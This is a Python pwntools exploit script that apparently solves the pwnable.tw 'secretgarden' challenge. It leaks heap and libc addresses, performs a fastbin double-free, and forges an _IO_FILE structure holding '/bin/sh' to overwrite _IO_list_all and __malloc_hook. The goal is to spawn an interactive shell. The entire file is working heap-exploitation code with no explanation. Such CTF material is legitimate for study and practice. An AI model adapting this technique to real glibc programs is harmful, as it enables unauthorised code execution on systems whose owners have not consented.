from pwn import *
import time

elf = ELF('./secretgarden')

#start secretgarden
p = process(["./secretgarden"], env={"LD_PRELOAD":"./libc_64.so.6"})
#pwnlib.gdb.attach(p, "heap trace\nc\n")

#p = remote("chall.pwnable.tw", 10203)

def plant_flower(length=40, name="A"*39, color="BBBBBBBB"):
	p.sendafter("Your choice :", "1\n")
	p.sendafter("Length of the name :", "%d\n" % length)
	p.sendafter("The name of flower :", "%s\n" % name)
	p.sendafter("The color of the flower :", "%s\n" % color)

def remove_flower(index):
	p.sendafter("Your choice :", "3\n")
	p.sendafter("remove from the garden:", "%d\n" % index)

def clean():
	p.sendafter("Your choice :", "4\n")

def visit():
	p.sendafter("Your choice :", "2\n")

#plant, remove, then plant to get addrs
for i in range(4):
	plant_flower(length=500, name="A"*8)

for i in range(4):
	remove_flower(3-i)

for i in range(3):
	plant_flower(length=500, name="AAAAAAA")

visit()
print

p.readuntil("Name of the flower[4] :AAAAAAA\n")
heap_leak = u64(p.read(6)+"\x00\x00")
log.info("HEAP LEAK:  0x%016x" % heap_leak)

p.readuntil("Name of the flower[5] :AAAAAAA\n")
arena_leak = u64(p.read(6)+"\x00\x00")
log.info("ARENA LEAK: 0x%016x" % arena_leak)

arena_base = (arena_leak & ((2**64-1)-(2**12-1)))
libc_base = arena_base - 0x3c3000
log.info("LIBC BASE:  0x%016x" % libc_base)

io_list_all = arena_base + 0x1520
system = libc_base + 0x45390

#MAGIC = libc_base + 0x4520f
MAGIC = libc_base + 0x4526a

# 0x000000000007cb40: mov rax, rdi; ret;
#MAGIC = libc_base + 0x7cb40

log.info("MAGIC:      0x%016x" % (MAGIC))
print

remove_flower(4)
remove_flower(5)
remove_flower(6)
clean()

###############################################################################
# ok time for the exploit
# fastbin attack

plant_flower(length=0x68)
plant_flower(length=0x68)
plant_flower()
plant_flower()
plant_flower()

# construct fake _IO_FILE to overwrite IO_list_all
payload = ""
stream = "/bin/sh\x00" # fake file stream
stream += p64(0)*2
stream += p64(2) + p64(3)
stream = stream.ljust(0xa0,"\x00")
stream += p64(heap_leak+0x6a0)
stream = stream.ljust(0xc0,"\x00")
stream += p64(1)
payload += stream
payload += p64(0)*2

payload += p64(heap_leak+0x6a0+len(payload)+8)
payload += p64(0)*3 # vtable
payload += p64(system)

plant_flower(length=1024, name=payload)

remove_flower(1)
remove_flower(0)
remove_flower(1)
remove_flower(2)

plant_flower(length=0x68, name=p64(io_list_all - 0x20 - 0x3)+p64(0xdeadbeef))
remove_flower(3)
plant_flower(length=0x68)
remove_flower(4)
plant_flower(length=0x68)

plant_flower(length=0x68, name="AAAAAAAABBBBBBBBCCC" + p64(heap_leak+0x6a0)) # overwrite __malloc_hook

#raw_input()

#p.sendafter("Your choice :", "1" + "\n") # trigger overwritten __malloc_hook

remove_flower(4)
remove_flower(4)

p.interactive()
